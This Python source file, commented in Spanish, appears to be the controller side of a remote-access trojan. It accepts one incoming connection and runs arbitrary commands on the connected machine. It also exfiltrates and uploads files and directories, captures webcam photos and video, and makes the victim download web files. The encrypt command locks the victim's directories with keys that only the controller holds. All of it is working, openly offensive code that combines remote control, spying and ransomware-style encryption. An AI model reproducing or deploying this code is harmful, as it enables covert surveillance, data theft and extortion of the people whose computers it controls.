import socket
import os
import re
import pickle
import struct
import cv2
import numpy
import platform
from time import sleep
from colorama import init
from colorama.ansi import Fore
from cryptography.fernet import Fernet
from udp import UDP

init(autoreset=True)

# Clase server-TCP
class TCP:
    # Se inicializa el host, el port y el chunk del programa
    def __init__(self, host, port):
        # host --> 0.0.0.0
        self.__host = host
        # port --> 1024-65535
        self.__port = port
        # chunk -->  4MB para enviar informacion
        self.__chunk = 4194304
        self.__myOs = platform.system().lower()

        # Se crea un socket
        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Se configura el socket
        self.__sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Se enlazan el host y el port
        self.__sock.bind((self.__host, self.__port))
        # El servidor se pone en escucha
        self.__sock.listen(1)
        print(Fore.CYAN + f"[*] Esperando conexion en el puerto {self.__port}")

        # Se recibe la conexion y la direccion
        self.__conexion, self.__addr = self.__sock.accept()
        print(Fore.GREEN + f"[+] Conexion establecida con {self.__addr[0]}")

        sleep(0.05)
        # Se crea un directorio inicial
        self.initDir = os.getcwd()
        # Se inicializa la variable para las imagenes
        self.pics = 0
        # Se recibe la informacion inicial
        info = self.__conexion.recv(1024).decode()
        info = info.split('\n')
        self.__userName = info[0]
        self.__hostName = info[1]
        self.__currentDir = info[2]

    # Imprime la terminal
    def terminal(self):
        print(Fore.GREEN + "\u250c\u2500\u2500(" + Fore.BLUE + f"{self.__userName}~{self.__hostName}" + Fore.GREEN + ")-[" + Fore.WHITE + self.__currentDir + Fore.GREEN + ']')
        print(Fore.GREEN + "\u2514\u2500" + Fore.BLUE + "> ", end='')

    # Funcion para regresar el nombre de un archivo o directorio
    # ubicacion --> ubicacion del archivo o directorio
    def getNombre(self, ubicacion):
        nombre = os.path.abspath(ubicacion)
        nombre = os.path.basename(nombre)
        return nombre

    # Funcion para generar una clave de encriptacion
    # clave --> nombre del archivo en que se almacena la clave
    def generarClave(self, clave):
        key = Fernet.generate_key()

        with open(clave, 'wb') as keyFile:
            keyFile.write(key)
        keyFile.close()
        print(Fore.GREEN + f"[+] Clave \"{clave}\" generada")

    # Funcion para regresar una clave de encriptacion
    # clave --> ubicacio del archivo en donde se almacena la clave
    def cargarClave(self, clave):
        return open(clave, 'rb').read()

    # Funcion para obtener la escala de una imagen (adaptar la imagen)
    # height --> alto de la imagen
    # width --> ancho de la imagen
    def escalar(self, height, width):
        if height > width:
            escala = 600/height
        elif width > height:
            escala = 600/width
        else:
            escala = (height+width)/2
            escala = 600/escala

        # Se regresa la escala que se usara para la imagen
        return escala

    # Funcion para enviar datos
    # info --> informacion a enviar
    def enviarDatos(self, info):
        info = pickle.dumps(info)
        info = struct.pack('Q', len(info))+info
        self.__conexion.sendall(info)

    # Funcion para recibir datos
    def recibirDatos(self):
        data = b''
        size = struct.calcsize('Q')
        while len(data) < size:
            info = self.__conexion.recv(self.__chunk)
            data += info

        dataSize = data[:size]
        data = data[size:]
        byteSize = struct.unpack('Q', dataSize)[0]

        while len(data) < byteSize:
            data += self.__conexion.recv(self.__chunk)

        info = data[:byteSize]
        data = data[byteSize:]
        info = pickle.loads(info)

        # Se regresa la informacion tratada para ser usada
        return info

    # Funcion para enviar un archivo
    # ubicacion --> ubicacion del archivo que se quiere enviar
    def enviarArchivo(self, ubicacion):
        sleep(0.05)
        peso = os.path.getsize(ubicacion)
        self.__conexion.send(f"{peso}".encode())

        if peso > 0:
            paquetes = int(peso/self.__chunk)
            if paquetes == 0:
                paquetes = 1
            print(Fore.CYAN + f"[*] Paquetes estimados: {paquetes}")

            sleep(0.1)
            i = 0
            with open(ubicacion, 'rb') as archivo:
                info = archivo.read(self.__chunk)
                while info:
                    self.enviarDatos(info)
                    info = archivo.read(self.__chunk)
                    print(f"Paquete {i} enviado", end='\r')
                    i += 1
                    msg = self.__conexion.recv(8).decode()
                    if msg == "end":
                        break
            archivo.close()

            print(Fore.GREEN + f"[+] Archivo \"{ubicacion}\" enviado")

        else:
            print(Fore.YELLOW + f"[!] sft: Archivo \"{ubicacion}\" vacio -- Peso: {peso}")

    # Funcion para recibir un archivo
    # ubicacion --> ubicacion en donde se guardara el archivo recibido
    def recibirArchivo(self, ubicacion):
        info = self.__conexion.recv(1024).decode().split('-')
        peso = int(info[0])
        paquetes = int(info[1])

        if peso > 0:
            if paquetes == 0:
                paquetes = 1
            print(Fore.CYAN + f"[*] Paquetes estimados: {paquetes}")

            i = 0
            with open(ubicacion, 'wb') as archivo:
                while True:
                    info = self.recibirDatos()
                    archivo.write(info)

                    if len(info) < self.__chunk:
                        self.__conexion.send("end".encode())
                        break
                    else:
                        self.__conexion.send("ok".encode())
                        print(f"Paquete {i+1} recibido", end='\r')
                        i += 1
            archivo.close()
            print(Fore.GREEN + f"[+] Archivo \"{ubicacion}\" creado")

        else:
            print(Fore.YELLOW + f"[!] sff: Archivo \"{ubicacion}\" vacio -- Peso: {peso}")

    # Funcion para enviar archivos de un directorio
    # cmd --> comando ejecutado
    # origen --> ubicacion del directorio que se quiere enviar
    # index --> indice desde el que se quiere iniciar
    def enviarDirectorio(self, cmd, origen, index):
        # Se calcula el numero de archivos
        archivos = []
        for i in os.listdir(origen):
            archivo = f"{origen}/{i}"
            if os.path.isfile(archivo):
                archivos.append(archivo)
        tam = len(archivos)
        print(Fore.CYAN + f"[*] Numero de archivos: {tam}")

        sleep(0.1)
        self.__conexion.send(str(tam).encode())

        # Se comienzan a enviar los archivos
        if index > tam:
            index = 1
        subidos = 0
        while index <= tam:
            nombre = self.getNombre(archivos[index-1])
            peso = os.path.getsize(archivos[index-1])
            paquetes = int(peso/self.__chunk)

            if peso > 0:
                if re.search("-a[= ]", cmd):
                    print(Fore.MAGENTA + f"{index}/{tam}. ", end='')
                    res = 'S'
                else:
                    print(Fore.MAGENTA + f"\n[?] {index}/{tam}. Subir \"{nombre}\" ({paquetes})?...\n[S/n] ", end='')
                    res = input()
            else:
                print(Fore.YELLOW + f"\n[!] {index}/{tam}. Archivo \"{nombre}\" omitido ({nombre}, {paquetes})")
                res = 'N'

            sleep(0.05)
            if len(res) == 0 or res.upper() == 'S':
                self.__conexion.send('S'.encode())
                sleep(0.02)
                self.__conexion.send(nombre.encode())
                self.enviarArchivo(archivos[index-1])
                subidos += 1
                msg = self.__conexion.recv(1024).decode()
                if msg[:6] == "error:":
                    print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")
                    break

            elif res.lower() == 'q' or res.lower() == "quit":
                self.__conexion.send("quit".encode())
                break

            else:
                self.__conexion.send('N'.encode())

            index += 1
            sleep(0.05)

        print(Fore.GREEN + f"[+] {subidos} archivos subidos de {tam}")

    # Funcion para recibir un directori
    # cmd --> comando ejecutado
    # destino --> Directorio en el que se guardaran los archivos
    # index --> indice desde el que se quiere iniciar
    def recibirDirectorio(self, cmd, destino, index):
        # Se recibe el numero de archivos
        if not os.path.isdir(destino):
            os.mkdir(destino)
        tam = int(self.__conexion.recv(1024).decode())
        print(Fore.CYAN + f"[*] Numero de archivos: {tam}")

        # Se comienzan a recibir los archivos
        if index > tam:
            index = 1
        bajados = 0
        while index <= tam:
            info = self.__conexion.recv(1024).decode()
            info = info.split('\n')
            nombre, paquetes, peso = info[:3]
            peso = int(peso)

            if peso > 0:
                if re.search("-a[= ]", cmd):
                    print(Fore.MAGENTA + f"{index}/{tam}. ", end='')
                    res = 'S'
                else:
                    print(Fore.MAGENTA + f"\n[?] {index}/{tam}. Bajar \"{nombre}\" (-p{paquetes}, -s{peso})?...\n[S/n] ", end='')
                    res = input()
            else:
                print(Fore.YELLOW + f"\n[!] {index}/{tam}. Archivo \"{nombre}\" omitido (-p{paquetes}, -s{peso})")
                res = 'N'

            if len(res) == 0 or res.upper() == 'S':
                try:
                    self.__conexion.send('S'.encode())
                    self.recibirArchivo(f"{destino}/{nombre}")
                    bajados += 1
                    sleep(0.08)
                    self.__conexion.send("ok".encode())
                except:
                    self.__conexion.send("error".encode())

            elif res.lower() == 'q' or res.lower() == "quit":
                self.__conexion.send("quit".encode())
                break

            else:
                self.__conexion.send('N'.encode())

            index += 1

        print(Fore.GREEN + f"[+] {bajados} archivos descargados de {tam}")

    # Funcion para ejecutar comandos en la maquina local
    # cmd --> comando que se quiere ejecutar
    def local(self, cmd):
        if cmd.lower()[:2] == "cd":
            directorio = cmd[3:]
            if os.path.isdir(directorio):
                os.chdir(directorio)
                print(os.getcwd())

            else:
                print(Fore.YELLOW + f"[!] Directorio \"{directorio}\" no encontrado")

        else:
            os.system(cmd)

    # Funcion para terminar la conexion entre maquinas
    # cmd --> comando ingresado
    def exit(self, cmd):
        print(Fore.MAGENTA + f"[?] Segur@ que quieres terminar la conexion con {self.__addr}?...\n[S/n] ", end='')
        res = input()

        if len(res) == 0 or res.upper() == 'S':
            self.__conexion.send(cmd.encode())
            self.__conexion.close()
            self.__sock.close()
            print(Fore.YELLOW + f"[!] Conexion terminada con {self.__userName}@{self.__addr[0]}")
            return True
        else:
            print(Fore.YELLOW + f"[!] Operacion cancelada")
            return False

    # Funcion para cambiar de directorio en el cliente
    # cmd --> comando ingresado
    def cd(self, cmd):
        self.__conexion.send(cmd.encode())

        msg = self.__conexion.recv(1042).decode()
        if msg[:6] != "error:":
            if len(msg) > 40:
                msg = f"... {msg[-40:]}"
            self.__currentDir = msg
        else:
            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    # Funcion para recibir un archivo del cliente
    # cmd --> comando ingresado
    def sendFileFrom(self, cmd):
        if re.search("-d[= ]", cmd):
            destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
            self.__conexion.send(cmd.encode())

            msg = self.__conexion.recv(1024).decode()
            if msg[:6] != "error:":
                self.recibirArchivo(destino)

            else:
                print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

        else:
            self.__conexion.send(cmd.encode())

            msg = self.__conexion.recv(1024).decode()
            if msg[:6] != "error:":
                destino = self.__conexion.recv(1024).decode()
                self.recibirArchivo(destino)

            else:
                print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    # Funcion para enviar un archivo al cliente
    # cmd --> comando ingresado
    def sendFileTo(self, cmd):
        if re.search("-d[= ]", cmd):
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]

            if os.path.isfile(origen):
                self.__conexion.send(cmd.encode())
                self.enviarArchivo(origen)

            else:
                print(Fore.YELLOW + f"[!] Archivo \"{origen}\" no encontrado")

        else:
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]

            if os.path.isfile(origen):
                self.__conexion.send(cmd.encode())
                nombre = self.getNombre(origen)

                sleep(0.05)
                self.__conexion.send(nombre.encode())
                self.enviarArchivo(origen)

            else:
                print(Fore.YELLOW + f"[!] Archivo \"{origen}\" no encontrado")

    # Funcion para recibir y visualizar una imagen
    # cmd --> comando ingresado
    def image(self, cmd):
        self.__conexion.send(cmd.encode())

        msg = self.__conexion.recv(1024).decode()
        if msg[:6] != "error:":
            nombre = self.__conexion.recv(1024).decode()
            info = self.recibirDatos()

            matriz = numpy.frombuffer(info, dtype=numpy.uint8)
            imagen = cv2.imdecode(matriz, -1)

            if re.search("-t[= ]", cmd):
                escala = float(re.findall("-t[= ]([0-9.].*)", cmd)[0])
            else:
                height, width = imagen.shape[:2]
                escala = self.escalar(height, width)
            imagen = cv2.resize(imagen, None, fx=escala, fy=escala)
            print(f"Escala: {escala}")

            if re.search("-90", cmd):
                imagen = cv2.rotate(imagen, cv2.ROTATE_90_COUNTERCLOCKWISE)
            if re.search("-180", cmd):
                imagen = cv2.rotate(imagen, cv2.ROTATE_180)
            if re.search("-270", cmd):
                imagen = cv2.rotate(imagen, cv2.ROTATE_90_CLOCKWISE)
            if re.search("-x", cmd):
                imagen = cv2.flip(imagen, 0)
            if re.search("-y", cmd):
                imagen = cv2.flip(imagen, 1)
            if re.search("-g", cmd):
                imagen = cv2.cvtColor(imagen, cv2.COLOR_BGR2GRAY)
            if re.search("-n", cmd):
                imagen = 255 - imagen
            if re.search("-m", cmd):
                flip = cv2.flip(imagen, 1)
                imagen = numpy.hstack((imagen, flip))
            if re.search("-c", cmd):
                grises = cv2.cvtColor(imagen, cv2.COLOR_BGR2GRAY)
                blur = cv2.GaussianBlur(grises, (3,3), 0)
                t1 = int(input("Threshold1: "))
                t2 = int(input("Threshold2: "))
                canny = cv2.Canny(image=blur, threshold1=t1, threshold2=t2)
                imagen = cv2.cvtColor(canny, cv2.COLOR_GRAY2BGR)

            print(f"{self.__userName}@{self.__addr[0]}: {nombre}")
            cv2.imshow(f"{self.__userName}@{self.__addr[0]}: {nombre}", imagen)
            cv2.waitKey()
            cv2.destroyAllWindows()

        else:
            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    # Funcion para recibir una foto de la camara y visualizarla
    # cmd --> comando ingresado
    def pic(self, cmd):
        self.__conexion.send(cmd.encode())

        msg = self.__conexion.recv(1024).decode()
        if msg[:6] != "error:":
            info = self.recibirDatos()

            matriz = numpy.frombuffer(info, dtype=numpy.uint8)
            imagen = cv2.imdecode(matriz, -1)

            height, width = imagen.shape[:2]
            escala = self.escalar(height, width)
            imagen = cv2.resize(imagen, None, fx=escala, fy=escala)

            print(f"Escala: {escala}")
            cv2.imshow(f"{self.__userName}@{self.__addr[0]}: Foto", imagen)
            cv2.waitKey()
            cv2.destroyAllWindows()

            if re.search("-s", cmd):
                if not os.path.isdir(f"{self.initDir}/pics"):
                    os.mkdir(f"{self.initDir}/pics")
                fotoRuta = f"{self.initDir}/pics/pic{self.pics}.jpg"
                cv2.imwrite(fotoRuta, imagen)
                print(Fore.GREEN + f"[+] Foto \"{fotoRuta}\" guardada")
                self.pics += 1
        
        else:
            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    # Funcion para recibir video del cliente
    # cmd --> comando ingresado
    def captura(self, cmd):
        udp = UDP(self.__host, self.__port)
        self.__conexion.send(cmd.encode())

        msg = self.__conexion.recv(1024).decode()
        if msg[:6].lower() != "error:":
            try:
                udp.conectar()
                udp.captura(self.__userName)
                sleep(0.5)
                udp.close()
                msg = self.__conexion.recv(1024).decode()
                print(msg)
            except:
                udp.close()
                msg = self.__conexion.recv(1024).decode()
                print(msg)
        else:
            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    # Funcion para recibir un directorio del cliente
    # cmd --> comando ingresado
    def sendDirFrom(self, cmd):
        if re.search("-d[= ]", cmd):
            if re.search("-i[= ]", cmd):
                destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*) -i", cmd)[0]
                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                if index <= 0:
                    index = 1
            else:
                destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
                index = 1

            self.__conexion.send(cmd.encode())
            msg = self.__conexion.recv(1024).decode()
            if msg[:6] != "error:":
                self.recibirDirectorio(cmd, destino, index)
            else:
                print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

        else:
            if re.search("-i[= ]", cmd):
                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                if index <= 0:
                    index = 1
            else:
                index = 1

            self.__conexion.send(cmd.encode())
            msg = self.__conexion.recv(1024).decode()
            if msg[:6] != "error:":
                destino = self.__conexion.recv(1024).decode()
                self.recibirDirectorio(cmd, destino, index)
            else:
                print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    # Funcion para enviar un directorio al cliente
    # cmd --> comando ingresado
    def sendDirTo(self, cmd):
        if re.search("-d[= ]", cmd):
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
            if re.search("-i[= ]", cmd):
                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                if index <= 0:
                    index = 1
            else:
                index = 1

            if os.path.isdir(origen):
                self.__conexion.send(cmd.encode())
                self.enviarDirectorio(cmd, origen, index)
            else:
                print(Fore.YELLOW + f"Directorio \"{origen}\" no encontrado")

        else:
            if re.search("-i[= ]", cmd):
                origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -i", cmd)[0]
                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                if index <= 0:
                    index = 1
            else:
                origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
                index = 1

            if os.path.isdir(origen):
                self.__conexion.send(cmd.encode())
                sleep(0.05)
                destino = self.getNombre(origen)
                self.__conexion.send(destino.encode())
                self.enviarDirectorio(cmd, origen, index)
            else:
                print(Fore.YELLOW + f"Directorio \"{origen}\" no encotrado")

    # Funcion para comprimir un directorio del cliente
    # cmd --> comando ingresado
    def comprimir(self, cmd):
        self.__conexion.send(cmd.encode())
        msg = self.__conexion.recv(1024).decode()

        if msg[:6] != "error:":
            print(Fore.GREEN + f"[+] {self.__userName}@{self.__addr[0]}: {msg}")
        else:
            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    # Funcion para descomprimir un archivo '.zip' del cliente
    # cmd --> comando ingresado
    def descomprimir(self, cmd):
        self.__conexion.send(cmd.encode())
        msg = self.__conexion.recv(1024).decode()

        if msg[:6] != "error:":
            print(Fore.GREEN + f"[+] {self.__userName}@{self.__addr[0]}: {msg}")
        else:
            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    # Funcion para encriptar un directorio del cliente
    # cmd --> comando ingresado
    def encrypt(self, cmd):
        clave = re.findall("-k[= ]([a-zA-Z0-9./ ].*) -e", cmd)[0]
        directorio = re.findall("-e[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
        if clave.endswith(".key"):
            self.generarClave(f"{clave}")
            key = self.cargarClave(f"{clave}")

            self.__conexion.send(cmd.encode())
            sleep(0.05)
            self.__conexion.send(key)

            msg = self.__conexion.recv(1024).decode()
            if msg[:6] != "error:":
                nombre = msg.split('\n')[1]
                print(Fore.MAGENTA + f"[?] Segur@ que quieres encriptar el directorio \"{nombre}\"?...\n[S/n] ", end='')
                res = input()

                if len(res) == 0 or res.upper() == 'S':
                    self.__conexion.send('S'.encode())

                    msg = self.__conexion.recv(1024).decode()
                    if msg[:6] != "error:":
                        print(Fore.GREEN + f"[+] {self.__userName}@{self.__addr[0]}: {msg}")
                        self.recibirArchivo(f"{self.initDir}/{clave}.dat")
                    else:
                        print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

                else:
                    self.__conexion.send('N'.encode())
                    msg = self.__conexion.recv(1024).decode()
                    print(Fore.YELLOW + f"[!] {self.__userName}@{self.__addr[0]}: {msg}")

            else:
                print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

        else:
            print(Fore.YELLOW + f"[!] Error al crear la clave \"{clave}\"")

    # Funcion para desencriptar un directorio del cliente
    # cmd --> comando ingresado
    def decrypt(self, cmd, clave):
        if os.path.isfile(clave) and clave.endswith(".key"):
            print(Fore.MAGENTA + f"[?] Segur@ que quieres usar la clave \"{clave}\"?...\n[S/n] ", end='')
            res = input()

            if len(res) == 0 or res.upper() == 'S':
                key = self.cargarClave(clave)
                self.__conexion.send(cmd.encode())
                sleep(0.05)
                self.__conexion.send(key)

                msg = self.__conexion.recv(1024).decode()
                if msg[:6] != "error:":
                    nombre = msg.split('\n')[1]
                    print(Fore.MAGENTA + f"[?] Segur@ que quieres desencriptar el directorio \"{nombre}\"?...\n[S/n] ", end='')
                    res = input()

                    if len(res) == 0 or res.upper() == 'S':
                        self.__conexion.send('S'.encode())

                        msg = self.__conexion.recv(1024).decode()
                        if msg[:6] != "error:":
                            print(Fore.GREEN + f"[+] {self.__userName}@{self.__addr[0]}: {msg}")
                            self.recibirArchivo(f"{self.initDir}/{self.getNombre(clave)}.dat")
                            os.remove(f"{clave}")
                            print(Fore.YELLOW + f"[!] Clave \"{clave}\" eliminada")

                        else:
                            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

                    else:
                        self.__conexion.send('N'.encode())
                        msg = self.__conexion.recv(1024).decode()
                        print(Fore.YELLOW + f"[!] {self.__userName}@{self.__addr[0]}: {msg}")

                else:
                    print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

            else:
                print(Fore.YELLOW + f"[!] Desencriptacion cancelada")
        else:
            print(Fore.YELLOW + f"[!] Clave \"{clave}\" no encontrada")

    # Funcion para descargar archivos web en la maquina del cliente
    # cmd --> comando ingresado
    def wget(self, cmd):
        self.__conexion.send(cmd.encode())

        msg = self.__conexion.recv(1024).decode()
        if msg[:6] != "error:":
            msg = self.__conexion.recv(1024).decode()
            if msg[:6] != "error:":
                print(Fore.GREEN + f"[+] {self.__userName}@{self.__addr[0]}: {msg}")
            else:
                print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")
        else:
            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    # Funcion para obtener la cantidad de elementos de un directorio
    # cmd --> comando ingresado
    def lenDir(self, cmd):
        self.__conexion.send(cmd.encode())

        msg = self.__conexion.recv(1024).decode()
        if msg[:6] != "error:":
            msg = self.__conexion.recv(1024).decode()
            print(Fore.GREEN + f"[+] {self.__userName}@{self.__addr[0]}: {msg}")
        else:
            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    # Funcion para guardar en un archivo de texto la salida de un comando
    # cmd --> comando ingresado
    def save(self, cmd):
        self.__conexion.send(cmd.encode())
        with open(f"{self.initDir}/info.txt", 'w') as archivo:
            while True:
                info = self.recibirDatos().decode()
                archivo.write(info)

                if len(info) < self.__chunk:
                    break
        archivo.close()
        print(Fore.GREEN + "[+] Informacion guardada")

    # Funcion para ingresar y evaluar comandos
    def shell(self):
        try:
            while True:
                self.terminal()
                cmd = input()

                if cmd == '' or cmd.replace(' ', '') == '':
                    print(Fore.YELLOW + f"[!] Comando invalido")

                # Si el primer caracter del comando es '!',
                # se ejecuta un comando local
                elif cmd[0] == '!':
                    try:
                        self.local(cmd[1:])

                    except Exception as e:
                        print(Fore.RED + "[-] Error de sintaxis local")
                        print(e)

                # Si el comando es 'clear', 'cls' o 'clc'
                # se limpia la terminal
                elif cmd.lower() == "clear" or cmd.lower() == "cls" or cmd.lower() == "clc":
                    if self.__myOs == "linux" or self.__myOs == "darwin":
                        os.system("clear")
                    if self.__myOs == "windows":
                        os.system("cls")

                # Si el comando es 'exit'...
                elif cmd.lower() == "exit":
                    try:
                        # Se manda a llamar a la funcion 'self.exit'
                        # y se termina la conexion
                        salir = self.exit(cmd)
                        if salir:
                            break

                    except Exception as e:
                        print(Fore.RED + "[-] Error al terminar la conexion")
                        print(e)

                # Si el comando es 'q' o 'quit'...
                elif cmd.lower() == 'q' or cmd.lower() == "quit":
                    try:
                        # Se cierra todo pero el cliente se
                        # mantiene conectado
                        self.__conexion.send(cmd.encode())
                        self.__conexion.close()
                        self.__sock.close()
                        break

                    except Exception as e:
                        print(Fore.RED + "[-] Error al cerrar el programa")
                        print(e)

                # Si el comando es 'cd'...
                elif cmd.lower()[:2] == "cd":
                    try:
                        # Se manda a llamar a la funcion 'self.cd'
                        self.cd(cmd)

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (cd)")
                        print(e)

                # Si el comando es 'sff'...
                elif cmd.lower()[:3] == "sff":
                    try:
                        if re.search("-o[= ]", cmd):
                            # Se manda a llamar a la funcion
                            # 'self.sendFileFrom'
                            self.sendFileFrom(cmd)

                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro de origen (-o)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (sff)")
                        print(e)

                # Si el comando es 'sft'...
                elif cmd.lower()[:3] == "sft":
                    try:
                        if re.search("-o[= ]", cmd):
                            # Se manda a llamar a la funcion
                            # 'self.sendFileTo'
                            self.sendFileTo(cmd)
                        else:
                            print(Fore.RED + "[!] Falta del parametro de origen (-o)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (sft)")
                        print(e)

                # Si el comando es 'img'
                elif cmd.lower()[:3] == "img":
                    try:
                        if re.search("-i[= ]", cmd) or re.search("-r", cmd):
                            # Se manda a llamar a la funcion
                            # 'self.image'
                            self.image(cmd)
                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro imagen (-i)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (img)")
                        print(e)

                # Si el comando es 'pic'...
                elif cmd.lower()[:3] == "pic":
                    try:
                        if re.search("-c[= ]", cmd):
                            # Se manda a llamar a la funcion
                            # 'self.pic'
                            self.pic(cmd)
                        
                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro camara (-c)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (pic)")
                        print(e)

                # Si el comando es 'cap'...
                elif cmd.lower()[:3] == "cap":
                    try:
                        if re.search("-c[= ]", cmd):
                            # Se manda a llamar a la funcion
                            # 'self.cap'
                            self.captura(cmd)

                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro camara (-c)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (cap)")
                        print(e)

                # Si el comando es 'sdf'...
                elif cmd.lower()[:3] == "sdf":
                    try:
                        if re.search("-o[= ]", cmd):
                            # Se manda a llamar a la funcion
                            # 'self.sendDirFrom'
                            self.sendDirFrom(cmd)

                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro origen (-o)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (sdf)")
                        print(e)

                # Si el comando es 'sdt'...
                elif cmd.lower()[:3] == "sdt":
                    try:
                        if re.search("-o[= ]", cmd):
                            # Se manda a llamar a la funcion
                            # 'self.sendDirTo'
                            self.sendDirTo(cmd)
                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro origen (-o)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (sdt)")
                        print(e)

                # Si el comando es 'zip'...
                elif cmd.lower()[:3] == "zip":
                    try:
                        if re.search("-o[= ]", cmd):
                            # Se manda a llamar a la funcion
                            # 'self.comprimir'
                            self.comprimir(cmd)
                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro de origen (-o)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (zip)")
                        print(e)

                # Si el comando es 'unzip'...
                elif cmd.lower()[:5] == "unzip":
                    try:
                        if re.search("-o[= ]", cmd):
                            # Se manda a llamar a la funcion
                            # 'self.descomprimir'
                            self.descomprimir(cmd)

                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro de origen (-o)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (unzip)")
                        print(e)

                # Si el comando es 'encrypt'...
                elif cmd.lower()[:7] == "encrypt":
                    try:
                        if re.search("-k[= ]", cmd):
                            if re.search("-e[= ]", cmd):
                                # Se manda a llamar a la funcion
                                # 'self.encrypt'
                                self.encrypt(cmd)
                            else:
                                print(Fore.YELLOW + "[!] Falta del parametro encrypt (-e)")

                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro key (-k)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (encrypt)")
                        print(e)

                # Si el comando es 'decrypt'...
                elif cmd.lower()[:7] == "decrypt":
                    try:
                        if re.search("-d[= ]", cmd):
                            if re.search("-k[= ]", cmd):
                                clave = re.findall("-k[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
                                # Se manda a llamar a la funcion
                                # 'self.decrypt'
                                self.decrypt(cmd, clave)
                            else:
                                print(Fore.YELLOW + "[!] Falta del parametro key (-k)")

                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro decrypt (-d)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (decrypt)")
                        print(e)

                # Si el comando es 'miwget'...
                elif cmd.lower()[:6] == "miwget":
                    try:
                        if re.search("-u[= ]", cmd):
                            # Se manda a llamar a la funcion
                            # 'self.wget'
                            self.wget(cmd)
                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro url (-u)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (miwget)")
                        print(e)

                # Si el comando es 'lendir'...
                elif cmd.lower()[:6] == "lendir":
                    try:
                        if re.search("-p", cmd):
                            # Se manda a llamar a la funcion
                            # 'self.lenDir'
                            self.lenDir(cmd)

                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro path (-p)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (lenDir)")
                        print(e)

                # Si el comando es 'save'...
                elif cmd.lower()[:4] == "save":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.save'
                        self.save(cmd)

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (save)")
                        print(e)

                # Si no hay una coincidencia, se envia el comando
                # y se recibe lo que este regresa
                else:
                    try:
                        self.__conexion.send(cmd.encode())

                        while True:
                            info = self.recibirDatos().decode()
                            print(info)

                            if len(info) < self.__chunk:
                                break

                    except Exception as e:
                        print(Fore.RED + "[-] Error al ejecutar el comando")
                        print(e)

        except Exception as e:
            print(Fore.RED + "Excepcion en el programa principal")
            print(e)
